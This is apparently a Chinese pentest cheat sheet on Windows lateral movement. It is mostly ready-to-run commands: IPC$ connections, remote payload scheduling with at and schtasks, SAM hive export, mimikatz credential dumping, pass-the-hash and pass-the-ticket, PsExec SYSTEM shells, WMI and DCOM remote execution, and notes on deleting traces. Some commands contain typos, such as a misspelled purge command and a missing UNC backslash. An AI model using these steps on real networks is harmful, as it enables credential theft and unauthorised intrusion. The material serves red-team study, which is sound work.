    1、常用Windows远程连接和相关命令

    在渗透中，当我们拿到目标机器的用户明文密码或者NTLM Hash 后，可以通过PTH(pass the hash,凭据传递)的方法，将散列值或明文密码传递到目标机器中进行验证。与目标机器建立连接后，可以使用相对应的方法在Windows系统中执行命令。

    1、建立IPC$连接
net use \\192.168.100.41\ipc$ "gdjf@123" /user:administrator  ##建立IPC$连接
net use \\192.168.100.41\ipc$  /del ##删除ipc连接
net use  ## 查看连接状态
2、获取远程主机信息
dir \\192.168.100.41\c$ ##dir命令：列出远程主机的文件
tasklist /S 192.168.100.41 /U administrator /P test@123 ## 查看远程主机进程
3、建立计划任务
方法一：使用at命令
a、使用net time 命令确定远程主机当前的系统时间
   net time \\192.168.100.41
b、使用copy 命令将payload 文件复制到远程目标机器中。
   copy payload.exe \\192.168.100.41\C$ 
c、使用at命令将启动该文件。
   at \\192.168.100.41 14:30 C:\paload.exe
d、删除使用at命令创建计划任务的记录(进程ID为1)
   at \\192.168.100.41 1 /delete
   at \\192.168.100.41 14:40 cmd.exe /c "ipconfig > C:/1.txt" ##使用at远程执行命令后，先将执行结果写入本地文本文件，再使用type命令远程读取该文本文件。
   type \\192.168.100.41\C$\1.txt

 方法二：使用schtaks命令
 schtasks /create /s 192.168.100.41 /tn test /sc onstart /tr c:\calc.bat /ru system /f  ##创建一个叫test的计划任务，计划任务在开机启动时执行calc.bat，启动权限为system。
 schtasks /run /s 192.168.100.41 /i /tn "test" ##手动激活test任务
 schtasks /delete /s 192.168.100.41 /tn "test" /f ##删除test计划任务
 net use 名称 /del /y ##删除IPC$
 执行schtasks命令后的日志会在C:\\Windows\Tasks\SchedLgU.txt文件里面。

    2、windows 系统散列值获取

    如果想要在windows系统中抓取散列值或明文密码，必须将权限提升到system。本地用户名、散列值、和其他安全验证信息都保存在SAM文件中。lsass.exe进程用于实现window的安全策略（本地安全策略和登录策略）。可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。

    在windows 系统中，SAM文件的保存位置是C:\windows\system32\config。该文件是被锁定的，不允许复制。在渗透测试中，可以采用传统方法，在关闭windows操作系统之后，使用pe盘进入文件管理环境，直接复制SAM文件，也可以使用VSS等方法进行复制。

    4、通过SAM和System 文件抓取密码

    1、导出SAM 和System 文件
   无工具导出SAM文件，命令如下：

   reg save hklm\system system.hive
2、读取SAM和system文件获取NTLM Hash
   a、使用mimikatz 读取sam和system文件
      将sam.hive、system.hive文件放在mimikatz同目录下，然后输入下面的命令，获取散列值：
      lsadump::sam /sam:sam.hive /system:system.hive

   b、使用cain 读取SAM文件
      安装cain后，关闭防火墙，运行cain,进入cracker模块，选择“LM&NTLM”选项，选择“Import hashes from a sam database”选项。然后将之前保存的san文件导入，单击next按钮后，获取散列值。

   c、使用mimikatz直接读取本地SAM文件，导出hash 信息
    privilege::debug ## 提升权限
    token::elevate ##将权限提升到system
    lsadump::sam ##读取本地SAM文件，获得NTLM hash。

    3、哈希传递攻击

    哈希传递攻击原理：在Windows系统中,通常会使用NTLM Hash对访问资源的用户进行身份验证,在早期的Windows系统中则会使用LM Hash对用户账户密码加密处理进行验证,但当用户账户密码大于15位时则不使用LM Hash加密用户账户密码,后来从Windows Vista和Windows Server 2008系统开始,微软默认禁用LM Hash。使用NTLM作为身份认证时,不会使用明文口令,而是将明文口令通过系统API (例如: LsaLogonUser)生成Hash,再使用明文口令加密过对Hash作为身份验证凭据。但是如果攻击者在获取了用户的Hash的情况下,依旧可以使用Pass TheHash模拟该用户认证进行横向渗透。

    微软在2014年5月发布了kb2871997补丁,该补丁禁止本地管理员账户对远程计算机进行连接,这样的后果就是无法使用本地管理员用户的权限对远程计算机使用psexec,wmi,smbexec.schtasks、 at和访问远程主机的文件共享等方法进行操作。在实际测试中在对计算机系统更新了kb2871997补丁后,发现无法使用常规的Pass The Hash方法进行横向渗透,但是唯独只有Administrator账号(SID为500的账号)例外,使用该账号的Hash依旧可以进行Pass TheHash进行横向渗透。这里强调是SID为500的账号,在一些计算机中虽然Administrator账号被改名了,但不会影响SID的值,所以只要是使用SID为500的账号进行横向渗透,不会受到b2871997补丁的影响。

    1、使用 NTLM Hash 进行哈希传递

    1、在目标机器中，以管理员权限运行mimikatz，输入下面命令进行攻击：
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:test.com /ntlm:172DA611CFBFA85247ACF1F100A280A4"
2、执行命令后，跳出cmd.exe,就可以在命令行环境中尝试列出域控制器C盘的内容
dir \\dc\c$

    2、使用AES-256 密钥进行哈希传递

    1、获取AES-256密钥
mimikatz "privilege::debug" "sekurlsa::ekeys" 
2、在远程目标机器中，以管理员运行mimikatz，命令如下：
mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:test.com /aes:256:dd2008acc3f2075c2423e91a08e7ff3decbf2bf5e868d97725d66dddfc3709c9"

    4、票据传递攻击

    要想使用mimikatz的哈希传递功能，必须具有本地管理员权限。mimikatz同意提供了不需要本地管理员权限进行横向渗透测试的方法，例如票据传递（Pass the Ticket,PTT）。

    1、使用mimikatz 进行票据传递

    1、使用mimikatz 从内存中导出票据。执行后，会在当前目录下生成票据文件
mimikatz "privilege::debug" "sekurlsa::tickets /export"
2、清除内存中的票据
kerberos::purge
3、将票据文件注入内存，命令如下：
kerberos::ptt "C:\mimikatz_trunk\x64\[0;163965]-2-0-40e00000-Administrator@krbtgt-0DAY.ORG.kirbi"
4、将高权限的票据文件注入内存后，将列出远程计算机系统的文件目录
dir \\dc\c$

    2、使用kekeo 进行票据传递

    kekeo 需要使用域名、用户名、NTLM Hash 三者配合生成票据，再将票据导入，从而直接连接远程计算机

    1、运行kekeo,生成一个票据文件
kekeo "tgt::ask /user:administrator /domain:test.com /ntlm:172DA611CFBFA85247ACF1F100A280A4"
2、清除当前内存中的其他票据
kerbers::purge
3、使用kekeo将票据文件导入内存
kerberos::ptt 票据文件
4、导入后，输入exit退出kekeo,使用dir命令查看远程主机文件
dir \\dc\c$

    5、使用PsExec进行横向渗透

    PsExec 的原理：通过管道在远程目标机器上创建一个Psexec 服务，并在本地磁盘中生成一个名为“psexesvc” 的二进制文件，然后通过psexec 服用运行命令。

    1、PsTools中的PsExec

    1、需要远程系统开启ADMINS共享(默认开启)
2、在使用IPC连接目标系统后,可以不输入账号密码直接连接
3、在使用PsExec进行远程执行命令时,会在目标系统创建一个名为PSEXEC的服务,命令执行完成后会自动删除,创建服务时会产生大量的日志,容易被溯源。
4、使用PsExec优点在于可直接获取SYSTEM权限的交互式shell

1、获取交互式shell
   psexec.exe -accepteula \IP地址-s cmd.exe
      -accepieula:输入此参数不弹框
      -s:以SYSTEM权限运行远程进程。不加会获取一个用户权限的shell
   Tips:如果没有建立IPC连接, PsExesc需要指定两个参数

  psexec.exe -accepteula \\IP地址-u Username-p Password cmd.exe
      -u: Domain\Username
      -p: Password
2、执行命令
   psexec.exe -accepteula \\IP地址-u Username-p Password cmd.exe "ipconfig"


例子：
1、获取目标交互式shell后，建立IPC$连接。然后执行如下命令，获取system权限的shell。不加-s 则获取一个用户权限的shell
   PsExec.exe -accepteula \\192.168.100.41 -s cmd.exe

2、如果没有建立ipc$,需要加上账户和密码：
   psexec.exe -accepteula \\192.168.100.41 -u administrator -p test@123 cmd.exe
   使用psexec在目标主机上进行回显
    psexec.exe -accepteula \\192.168.100.41 -u administrator -p test@123 cmd.exe /c "ipconfig"

    6、使用WMI进行横向渗透

    WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。自psexec在内网中被严格监控后，越来越多的反病毒厂商将其加入黑名单。于是攻击者逐渐开始使用WMI进行横向渗透。而且Windows操作系统默认不会将WMI的操作日志记录在日志中。
    WMI攻击方式:
    (1) windows内置的wmic (缺点是无回显,可以将命令执行结果写入本地磁盘配合type命令远程读取)
    (2) impackets工具包中的wmiexec (主要在Linux跨Windows中经常使用)
    (3) wmiexec.vbs (可以回显,可以建立半交互式Shell,也可以执行单条命令）
    (4) Powersploit中的Invoke-WmiCommand
    (5) Invoke-WMIMethod

    1、Windows内置的wmic

    （1）在命令环境下输入下面命令，通过cmd执行一条命令并保存在c盘。
WMIC /node:192.168.3.132 /user:administrator /password:admin@123 process call create "cmd.exe /c ipconfig >c:\ip.txt"
（2）连接ipc$
 net user \\192.168.3.142\ipc$ "admin@123" /user:administrator
（3）使用type 命令读取执行结果
 type \\192.168.3.142\C$\ip.txt

    2、 impachet 工具包中的wmiexec

    在kali 中下载并安装impacket工具包后，输入如下命令：
wmiexec.py administrator:admin@123@192.168.3.142

    3、使用wmiexec.vbs 脚本

    wmiexec.vbs脚本通过vbs 调用WMI来模拟PsExec的功能。wmiexec.vbs可以在远程系统中执行命令并进行回显，获得远程主机的半个交互式shell。
cscript.exe /nologo wmiexec.vbs /shell 192.168.3.142 administrator admin@123 "ipconfig"

    4、Powersploit中的Invoke-WmiCommand

    Invoke-WmiCommand.ps1 脚本包含在powerspoit工具包中。该脚本主要通过powerhsell 调用WMI来远程执行命令，其本质上还是利用WMI

PS C:\> Import-Module .\Invoke-WmiCommand.ps1 ##导入模块
PS C:\> $User = "administrator"  ##目标系统用户名
PS C:\> $Password = ConvertTo-SecureString -String "admin@123" -AsPlainText -Force  ##目标系统密码
PS C:\> $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password ##将账户密码整合导入Credential
PS C:\> $Remote=Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.3.142 ##远程执行命令
PS C:\> $Remote.PayloadOuput##将执行结果输出到界面上

    5、Invoke-WMIMethod

    利用powershell 自带的Invoke-WMIMethod，可以在远程系统中执行命令和指定程序。执行如下命令，可以以非交互式的方式执行命令，但不会回显执行结果。
PS C:\> $User = "administrator"  ##目标系统用户名
PS C:\> $Password = ConvertTo-SecureString -String "admin@123" -AsPlainText -Force  ##目标系统密码
PS C:\> $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password ##将账户密码整合导入Credential
Ps C:\>Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc" -ComputerName "192.168.3.142" -Credential $Cred

    7、使用永恒之蓝进行横向渗透

    1、检测模块: auxillary/scanner/smb/smb_ms17_010

    9、 DCOM 在远程系统中的使用

    DCOM（分布式组件对象模型）是微软的一系列概念和程序的接口。通过DCOM，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。

    1、通过本地DCOM程序列表

    (1)获取DCOM程序列表
Get-CimInstance Win32_DCOMApplication  //powershell3.0 以上，win2012 server以上
Get-WmiObject -Namespace ROOT\CIMV2-Class Win32_DCOMApplication ##powershell 2.0,win7\win08 server
(2）使用DCOM执行任意命令
 $com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")

    2、使用DCOM在远程机器上执行命令

    (1)通过IPC$连接远程计算机
net use \\192.168.3.142 "admin@123" /user:test.org\administrator
(2)执行命令，调用MMC20.Application 远程执行命令
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.3.142"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","")
